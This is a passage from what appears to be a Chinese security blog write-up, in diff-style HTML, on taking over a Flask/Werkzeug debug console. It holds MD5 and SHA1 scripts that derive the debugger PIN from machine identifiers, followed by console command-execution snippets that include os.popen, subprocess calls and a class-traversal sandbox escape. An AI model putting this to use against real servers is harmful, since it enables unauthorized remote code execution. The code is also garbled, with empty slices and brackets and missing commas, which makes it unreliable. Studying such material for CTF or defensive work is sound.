hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     &#x27;flaskweb&#x27;</span><br><span class="line">     &#x27;flask.app&#x27;,</span><br><span class="line">     &#x27;Flask&#x27;,</span><br><span class="line">     &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">private_bits = [</span><br><span class="line">     &#x27;25214234362297&#x27;,</span><br><span class="line">     &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line">​</span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[]</span><br><span class="line">​</span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">   h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">   num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[]</span><br><span class="line">​</span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">   for group_size in 5, 4, 3:</span><br><span class="line">       if len(num) % group_size == 0:</span><br><span class="line">          rv = &#x27;-&#x27;.join(num[].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                      for x in range(0, len(num), group_size))</span><br><span class="line">          break</span><br><span class="line">       else:</span><br><span class="line">          rv = num</span><br><span class="line">​</span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-8-sha1"><a href="#3-8-sha1" class="headerlink" title="3.8 sha1"></a>3.8 sha1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#sha1</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;</span><br><span class="line">    &#x27;flask.app&#x27;,</span><br><span class="line">    &#x27;Flask&#x27;,</span><br><span class="line">    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377581187&#x27;,</span><br><span class="line">    &#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line">​</span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[]</span><br><span class="line">​</span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[]</span><br><span class="line">​</span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line">​</span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Console控制台执行指令"><a href="#Console控制台执行指令" class="headerlink" title="Console控制台执行指令"></a>Console控制台执行指令</h3><h4 id="这里做题就是进入控制台，然后执行命令"><a href="#这里做题就是进入控制台，然后执行命令" class="headerlink" title="这里做题就是进入控制台，然后执行命令"></a>这里做题就是进入控制台，然后执行命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. os</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.popen(&#x27;whoami&#x27;).read()</span><br><span class="line"></span><br><span class="line">2. subprocess.check_output</span><br><span class="line">&gt;&gt;&gt; import subprocess</span><br><span class="line">&gt;&gt;&gt; subprocess.check_output([])</span><br><span class="line"></span><br><span class="line">3. subprocess.run</span><br><span class="line">&gt;&gt;&gt; import subprocess</span><br><span class="line">&gt;&gt;&gt; subprocess.run([], capture_output=True, text=True)</span><br><span class="line"></span><br><span class="line">4. subprocess.Popen</span><br><span class="line">&gt;&gt;&gt; import subprocess</span><br><span class="line">&gt;&gt;&gt; subprocess.Popen([], stdout=subprocess.PIPE).stdout.read()</span><br><span class="line"></span><br><span class="line">5. find classes</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[].__init__.__globals__[](&#x27;whoami&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/340739.html"></a></p>
+
+  </article>
+  <!-- tag -->
+  <div class="mt-12 pt-6 border-t border-gray-200">
+    
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/python/">python</a>
+        </span>
+      
+    
+  </div>
+  <!-- prev and next -->
+  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
+    <div>
+      
+        <a href="/2024/12/17/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-zeroshell/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          <iconify-icon width="20" icon="ri:arrow-left-s-line" data-inline="false"></iconify-icon>
+          2024长城杯&CISCN-威胁流量分析-zeroshell
+        </a>
+      
+    </div>
+    <div>
+      
+        <a href="/2024/09/17/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          玄机WP
+          <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
+        </a>
+      
+    </div>
+  </div>
+  <!-- comment -->
+  <div class="article-comments mt-12">
+    
+
+  </div>
+</section>
+<!-- js inspect -->
+
+<script src="/lib/clipboard.min.js"></script>
+
+
+<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(() => {
+    const maraidConfig = {
+      theme: "default",
+      logLevel: 3,
+      flowchart: { curve: "linear" },
+      gantt: { axisFormat: "%m/%d/%Y" },
+      sequence: { actorMargin: 50 },
+    };
+    mermaid.initialize(maraidConfig);
+  });
+</script>
+
+
+
+<script src="/lib/fancybox/fancybox.umd.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+    $('.post-content').each(function(i){
+      $(this).find('img').each(function(){
+        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
+        var alt = this.alt;
+        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
+        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
+      });
+      $(this).find('.fancybox').each(function(){
+        $(this).attr('rel', 'article' + i);
+      });
+    });
+
+    Fancybox.bind('[data-fancybox="gallery"]', {
+        // options
+    })
+  })
+</script>
+
+<!-- tocbot begin -->
+
+<script src="/lib/tocbot/tocbot.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+      tocbot.init({
+        // Where to render the table of contents.
+        tocSelector: '.post-toc',
+        // Where to grab the headings to build the table of contents.
+        contentSelector: '.post-content',
+        // Which headings to grab inside of the contentSelector element.
+        headingSelector: 'h1, h2, h3',
+        // For headings inside relative or absolute positioned containers within content.
+        hasInnerContainers: true,
+    });
+  })
+</script>
+<!-- tocbot end -->
+
+
+  </main>
+  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
+  <!-- busuanzi -->
+  
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Busuanzi Analytics -->
+<div class="flex items-center gap-2">
+  <span>Visitors</span>
+  <span id="busuanzi_value_site_uv"></span>
+  <span>Page Views</span>
+  <span id="busuanzi_value_site_pv"></span>
+</div>
+<!-- End Busuanzi Analytics -->
+
+
+  <!-- copyright -->
+  <div class="flex items-center gap-2">
+    <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="color: inherit;">CC BY-NC-SA 4.0</a>
+    <span>© 2022</span>
+    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
+    <a href="https://github.com/xbmlz" target="_blank" rel="noopener noreferrer">xbmlz</a>
+  </div>
+  <!-- powered by -->
+  <div class="flex items-center gap-2">
+    <span>Powered by</span>
+    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
+    <span>&</span>
+    <a href="https://github.com/xbmlz/hexo-theme-maple" target="_blank" rel="noopener noreferrer">Maple</a>
+  </div>
+
+</footer>
+
+  <div class="back-to-top box-border fixed right-6 z-1024 -bottom-20 rounded py-1 px-1 bg-slate-900 opacity-60 text-white cursor-pointer text-center dark:bg-slate-600">
+    <span class="flex justify-center items-center text-sm">
+      <iconify-icon width="18" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
+      <span id="scrollpercent"><span>0</span> %</span>
+    </span>
+  </div>
+  
+<script src="/js/main.js"></script>
+
+
+  <script>
+    $(document).ready(function () {
+      const mapleCount = "10";
+      const speed = "0.5";
+      const mapleEl = document.getElementById("maple");
+      const maples = Array.from({ length: mapleCount }).map(() => {
+        const maple = document.createElement("div");
+        const scale = Math.random() * 0.5 + 0.5;
+        const offset = Math.random() * 2 - 1;
+        const x = Math.random() * mapleEl.clientWidth;
+        const y = -Math.random() * mapleEl.clientHeight;
+        const duration = 10 / speed;
+        const delay = -duration;
+        maple.className = "maple";
+        maple.style.width = `${24 * scale}px`;
+        maple.style.height = `${24 * scale}px`;
+        maple.style.left = `${x}px`;
+        maple.style.top = `${y}px`;
+        maple.style.setProperty("--maple-fall-offset", offset);
+        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
+        maple.style.animation = `fall ${duration}s linear infinite`;
+        maple.style.animationDelay = `${delay}s`;
+        mapleEl.appendChild(maple)
+        return maple
+      })
+    });
+  </script>
+  
+
+
+  <div class="fixed top-0 bottom-0 left-0 right-0 pointer-events-none print:hidden" id="maple"></div>
+</body>
+
+</html>
